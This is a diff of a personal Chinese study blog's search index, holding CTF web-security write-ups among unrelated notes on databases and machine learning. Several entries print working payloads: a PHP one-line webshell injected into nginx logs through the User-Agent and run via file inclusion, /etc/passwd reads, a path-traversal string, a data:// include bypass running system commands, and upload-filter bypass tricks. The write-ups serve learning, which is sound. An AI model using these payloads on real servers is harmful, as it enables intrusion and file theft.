+<li>我们在指定<code>include</code>包含目标日志文件后,木马代码<code>&lt;?php @eval($_GET[1]);?&gt;</code>得到执行,此时我们在<code>url</code>中传入参数,<code>&amp;1=system(&quot;ls&quot;);</code>,使得恶意代码变为:<code>&lt;?php @eval(system(&quot;ls&quot;)); ?&gt;</code>,该段代码得到解析和执行,从而使服务器内部文件的情况被回显到前端。</li>
+<li>一个小问题:<br><strong>为什么不可以把一句话木马写为:</strong><code>&lt;?php @eval(system(&#39;ls&#39;);)?&gt;</code><ul>
+<li>首先，这样的木马病毒非常不灵活，无法通过改变其中的参数去执行其他恶意指令</li>
+<li>其次，<code>eval</code>函数执行的命令会将结果输出于前端,通过参数动态控制命令，并将结果嵌入 HTTP 响应。<br>而<code>system</code>函数则默认将结果输出到服务端,需要额外配置才可以回显到前端。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h2><p><strong>插入位置:</strong></p>
+<p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>可以发现回显,是<code>nginx</code>服务器,让我们可以锁定日志文件的路径。<br>2.然后通过nginx日志默认路径打开日志文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。</p>
+<p>如图:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image">
+
+<h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+<p>先调出文件:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1">
+
+<p>然后再查看日志文件:<br>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure>
+<p>才可以利用repeater回显:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1">
+
+<p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>
+]]></content>
+      <categories>
+        <category>ctfshow web</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人学习感悟</title>
+    <url>/2025/03/30/%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E6%84%9F%E6%82%9F/</url>
+    <content><![CDATA[<h1 id="关于python库的学习"><a href="#关于python库的学习" class="headerlink" title="关于python库的学习"></a>关于python库的学习</h1><ul>
+<li>在学习的时候是缺什么学什么，不是一口气把库里面的东西走完，包括<code>re</code>这种自带的小库</li>
+</ul>
+]]></content>
+      <categories>
+        <category>个人安排</category>
+      </categories>
+      <tags>
+        <tag>感悟</tag>
       </tags>
   </entry>
   <entry>
@@ -3265,7 +3337,7 @@ print(result.group())
 <li><strong>定义</strong>：关系模式中的每个属性都不可再分，即属性是原子的。并且主属性（主键）不能为空且不重复 。例如学生选课关系模式中，每个属性如 “学号”“课程号” 等都不能再拆分成更小的子属性 ，这是关系型数据库最基本要求。</li>
 <li>比如:</li>
 </ul>
-<style>.lavlkcdwjigi{zoom:50%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324145245672.png" class="lavlkcdwjigi" alt="image-20250324145245672">
+<style>.hphizjwwyvdf{zoom:50%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324145245672.png" class="hphizjwwyvdf" alt="image-20250324145245672">
 
 <ul>
 <li>这里的歌手一列含有两个元素，不符合原子化的规范。比如学习成绩，这一栏就会有如:<code>&#123;&quot;英语&quot;:100,&quot;数学&quot;:100&#125;</code>的情况，这一栏就不符合原子化的原则，即不为1NF的规则。</li>
@@ -3285,9 +3357,9 @@ print(result.group())
 <li>基本介绍</li>
 <li>**定义：**第三范式（3NF）要求关系模式在满足第二范式（2NF）的基础上，不存在非主属性对主键的传递函数依赖 。</li>
 <li>举例：</li>
-<li><style>.vslgslqyceqf{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153727673.png" class="vslgslqyceqf" alt="image-20250324153727673"></li>
+<li><style>.kxmtkdrdpgdv{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153727673.png" class="kxmtkdrdpgdv" alt="image-20250324153727673"></li>
 <li>相当于横向有依赖。其解决方法也是把表拆开。</li>
-<li><style>.acihzvsvrhda{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153908868.png" class="acihzvsvrhda" alt="image-20250324153908868"></li>
+<li><style>.lhxynkmtgleh{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153908868.png" class="lhxynkmtgleh" alt="image-20250324153908868"></li>
 <li>解决方法如图所示。</li>
 </ul>
 <h3 id="BCNF"><a href="#BCNF" class="headerlink" title="BCNF"></a>BCNF</h3><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h3><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324154755016.png" class="" title="image-20250324154755016">
@@ -3340,6 +3412,28 @@ print(result.group())
       </categories>
       <tags>
         <tag>计算机基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计套路</title>
+    <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
+    <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&amp;<span class="variable">$_page</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>特别注意的点就是:</strong><br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
+<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?<br>这里就可以解释为什么buuctf那道题的payloads为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>为什么本应是..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,还在前面多加了一个&#x2F;,因为函数把?前面的字符全部截取走了,只剩下?和前面多加的&#x2F;以及后面的路径: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag,这里的&#x2F;是include的分割符号</p>
+<p><strong>详细见[HCTF 2018]WarmUp1</strong>的wp。</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -3445,45 +3539,6 @@ print(result.group())
       </tags>
   </entry>
   <entry>
-    <title>代码审计套路</title>
-    <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
-    <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&amp;<span class="variable">$_page</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>特别注意的点就是:</strong><br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
-<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?<br>这里就可以解释为什么buuctf那道题的payloads为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>为什么本应是..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,还在前面多加了一个&#x2F;,因为函数把?前面的字符全部截取走了,只剩下?和前面多加的&#x2F;以及后面的路径: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag,这里的&#x2F;是include的分割符号</p>
-<p><strong>详细见[HCTF 2018]WarmUp1</strong>的wp。</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行:使用文件包含绕过</title>
-    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
-<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
-]]></content>
-      <categories>
-        <category>ctfshow web</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>决策树分类算法学习</title>
     <url>/2025/03/01/%E5%86%B3%E7%AD%96%E6%A0%91%E5%88%86%E7%B1%BB%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="决策树分类算法学习"><a href="#决策树分类算法学习" class="headerlink" title="决策树分类算法学习"></a>决策树分类算法学习</h1><h2 id="XGBoost算法及其应用"><a href="#XGBoost算法及其应用" class="headerlink" title="XGBoost算法及其应用"></a>XGBoost算法及其应用</h2><h3 id="对于模型的保存"><a href="#对于模型的保存" class="headerlink" title="对于模型的保存"></a>对于模型的保存</h3><ul>
@@ -3519,56 +3574,21 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>文件上传疑点解析</title>
-    <url>/2025/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%96%91%E7%82%B9%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞成功的根本原理"><a href="#文件上传漏洞成功的根本原理" class="headerlink" title="文件上传漏洞成功的根本原理"></a>文件上传漏洞成功的根本原理</h1><h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><ul>
-<li>其本质就是欺骗服务器对文件后缀的解析，让一个后缀名被修改了的包含可执行恶意代码的文件可以被上传到服务器文件中使用户可以使用如中国蚁剑这样的工具去发送<code>POST</code>请求让服务器结构得到呈现从而实现黑进服务器的效果。</li>
-</ul>
-<h2 id="黑入成功的关键"><a href="#黑入成功的关键" class="headerlink" title="黑入成功的关键"></a>黑入成功的关键</h2><ul>
-<li><p>首先要让文件能够被成功上传:</p>
-<ul>
-<li><p>后缀名修改:<br>许多服务器仅通过文件后缀名验证文件类型。将<code>.php</code>改为<code>.jpg</code>&#x2F;<code>.png</code>可欺骗服务器认为这是合法图片文件，从而允许上传。</p>
-</li>
-<li><p>代码关键字的修改:<br>有些服务器会对文件源码进行筛查,比如会过滤掉<code>&lt;?</code>这样的符号，需要人为使用代码特性进行绕过。</p>
-</li>
-<li><p>文件头和<code>MIME</code>类型的修改:</p>
-<p>服务器可能会验证报单内容(文件头和<code>MIME</code>类型)，从而使恶意文件难以被成功上传到服务器中。<br>(文件头是和被上传的文件源码紧挨着的,写入时请不要和上方的参数挨着)。</p>
-</li>
-</ul>
-</li>
-<li><p>其次就是让文件被成功解析:</p>
-<ul>
-<li>目前所遇到的情况:服务器会根据URL后缀名选择解析方式，使得文件得到解析后让恶意代码执行</li>
-</ul>
-</li>
-</ul>
-<h1 id="和文件上传有关服务器报单参数"><a href="#和文件上传有关服务器报单参数" class="headerlink" title="和文件上传有关服务器报单参数"></a>和文件上传有关服务器报单参数</h1><ul>
-<li><p><code>Content-Disposition</code>参数:<br>该参数形如:</p>
-<img src="/2025/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%96%91%E7%82%B9%E8%A7%A3%E6%9E%90/image-20250412112937099.png" class="" title="image-20250412112937099">
-
-<p>该参数对服务器如何解析该文件<strong>没有任何影响</strong>,它只会影响文件保存的后缀名,如以<code>png</code>、<code>jpg</code>格式进行保存。</p>
-</li>
-<li><p>做一个提醒:<br>在buuctf 极客大挑战 [Upload]这道题中,刚开始以在<code>Content-Disposition</code>参数中以<code>png</code>格式名上传文件后在url中使用phtml对文件进行解析，是回显没有找到该文件的，后来在<code>Content-Disposition</code>参数中使用<code>phtml</code>格式名又上传了一次文件，再在url中以<code>phtml</code>形式解析，解析成功，但是我此时又以<code>png</code>的后缀名上传保存文件，在url中以后缀名为<code>phtml</code>解析文件也成功了，为什么第一次不能成功呢?<br>deepseek的解析,看看就得了:</p>
-<style>.txmhdhmkvvmm{zoom: 50%;}</style><img src="/2025/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%96%91%E7%82%B9%E8%A7%A3%E6%9E%90/image-20250412122906502.png" class="txmhdhmkvvmm" alt="image-20250412122906502">
-
-<p><strong>目前我只能说:</strong><br>自己多尝试几次,修改<code>Content-Disposition</code>和修改<code>url</code>中文件的后缀名，多试试,看是否可以解析成功。</p>
-</li>
-<li><p><code>url</code>中的文件后缀名:<br>该参数形如:</p>
-<p><code>/upload/demo.phtml</code><br>在一些服务器的配置中,修改后缀名才是可能让服务器改变对文件的解析方式的途径，从而使得恶意代码可以被成功执行。</p>
-</li>
-</ul>
+    <title>命令执行:使用文件包含绕过</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
+<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
 ]]></content>
       <categories>
-        <category>web安全</category>
+        <category>ctfshow web</category>
       </categories>
       <tags>
-        <tag>文件上传</tag>
+        <tag>命令执行</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>数据库基本概念</title>
-    <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>命令执行绕过符号总结</title>
@@ -3606,6 +3626,58 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>初识ai模型</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据库基本概念</title>
+    <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>文件上传疑点解析</title>
+    <url>/2025/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%96%91%E7%82%B9%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞成功的根本原理"><a href="#文件上传漏洞成功的根本原理" class="headerlink" title="文件上传漏洞成功的根本原理"></a>文件上传漏洞成功的根本原理</h1><h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><ul>
+<li>其本质就是欺骗服务器对文件后缀的解析，让一个后缀名被修改了的包含可执行恶意代码的文件可以被上传到服务器文件中使用户可以使用如中国蚁剑这样的工具去发送<code>POST</code>请求让服务器结构得到呈现从而实现黑进服务器的效果。</li>
+</ul>
+<h2 id="黑入成功的关键"><a href="#黑入成功的关键" class="headerlink" title="黑入成功的关键"></a>黑入成功的关键</h2><ul>
+<li><p>首先要让文件能够被成功上传:</p>
+<ul>
+<li><p>后缀名修改:<br>许多服务器仅通过文件后缀名验证文件类型。将<code>.php</code>改为<code>.jpg</code>&#x2F;<code>.png</code>可欺骗服务器认为这是合法图片文件，从而允许上传。</p>
+</li>
+<li><p>代码关键字的修改:<br>有些服务器会对文件源码进行筛查,比如会过滤掉<code>&lt;?</code>这样的符号，需要人为使用代码特性进行绕过。</p>
+</li>
+<li><p>文件头和<code>MIME</code>类型的修改:</p>
+<p>服务器可能会验证报单内容(文件头和<code>MIME</code>类型)，从而使恶意文件难以被成功上传到服务器中。<br>(文件头是和被上传的文件源码紧挨着的,写入时请不要和上方的参数挨着)。</p>
+</li>
+</ul>
+</li>
+<li><p>其次就是让文件被成功解析:</p>
+<ul>
+<li>目前所遇到的情况:服务器会根据URL后缀名选择解析方式，使得文件得到解析后让恶意代码执行</li>
+</ul>
+</li>
+</ul>
+<h1 id="和文件上传有关服务器报单参数"><a href="#和文件上传有关服务器报单参数" class="headerlink" title="和文件上传有关服务器报单参数"></a>和文件上传有关服务器报单参数</h1><ul>
+<li><p><code>Content-Disposition</code>参数:<br>该参数形如:</p>
+<img src="/2025/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%96%91%E7%82%B9%E8%A7%A3%E6%9E%90/image-20250412112937099.png" class="" title="image-20250412112937099">
+
+<p>该参数对服务器如何解析该文件<strong>没有任何影响</strong>,它只会影响文件保存的后缀名,如以<code>png</code>、<code>jpg</code>格式进行保存。</p>
+</li>
+<li><p>做一个提醒:<br>在buuctf 极客大挑战 [Upload]这道题中,刚开始以在<code>Content-Disposition</code>参数中以<code>png</code>格式名上传文件后在url中使用phtml对文件进行解析，是回显没有找到该文件的，后来在<code>Content-Disposition</code>参数中使用<code>phtml</code>格式名又上传了一次文件，再在url中以<code>phtml</code>形式解析，解析成功，但是我此时又以<code>png</code>的后缀名上传保存文件，在url中以后缀名为<code>phtml</code>解析文件也成功了，为什么第一次不能成功呢?<br>deepseek的解析,看看就得了:</p>
+<style>.bakplpmcjcee{zoom: 50%;}</style><img src="/2025/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%96%91%E7%82%B9%E8%A7%A3%E6%9E%90/image-20250412122906502.png" class="bakplpmcjcee" alt="image-20250412122906502">
+
+<p><strong>目前我只能说:</strong><br>自己多尝试几次,修改<code>Content-Disposition</code>和修改<code>url</code>中文件的后缀名，多试试,看是否可以解析成功。</p>
+</li>
+<li><p><code>url</code>中的文件后缀名:<br>该参数形如:</p>
+<p><code>/upload/demo.phtml</code><br>在一些服务器的配置中,修改后缀名才是可能让服务器改变对文件的解析方式的途径，从而使得恶意代码可以被成功执行。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -3667,82 +3739,6 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>大一寒假安排</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>正则匹配注意点个人笔记</title>
-    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p><strong>正则匹配个人易忽略点记录</strong></p>
